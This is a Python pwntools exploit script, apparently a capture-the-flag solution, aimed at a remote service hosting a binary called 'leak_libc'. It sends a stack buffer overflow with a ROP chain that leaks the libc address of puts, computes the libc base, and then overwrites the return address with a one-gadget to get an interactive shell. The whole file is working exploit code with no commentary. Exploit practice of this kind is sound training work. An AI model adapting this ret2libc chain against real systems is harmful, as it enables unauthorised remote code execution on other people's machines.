from pwn import *
context.log_level = 'debug'
p = remote("realsung.kr", 13319)

e = ELF("./leak_libc")
libc = ELF("./libc.so.6")
pop_rdi = 0x0000000000400753
oneshot = [0x4f3d5, 0x4f432, 0x10a41c]

p.recvuntil(b'address : ')
binsh = int(p.recvuntil(b" ").strip(), 16)
log.success(f'binsh : {hex(binsh)}')

payload =  b''
payload += b'A' * 320 + b'B' * 0x8
payload += p64(pop_rdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.sym['main'])

p.sendlineafter(b'Input >> ', payload)

pause()
leak_address = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leak : {hex(leak_address)}')

libcbase = leak_address - libc.symbols[b'puts']
system_add = libcbase + libc.symbols[b'system']
log.success(f'libcbase : {hex(libcbase)}')
log.success(f'libcbase : {hex(system_add)}')

payload =  b''
payload += b'A' * 320 + b'B' * 0x8
payload += p64(libcbase + oneshot[2])

p.sendlineafter(b'Input >> ', payload)
pause()

p.interactive()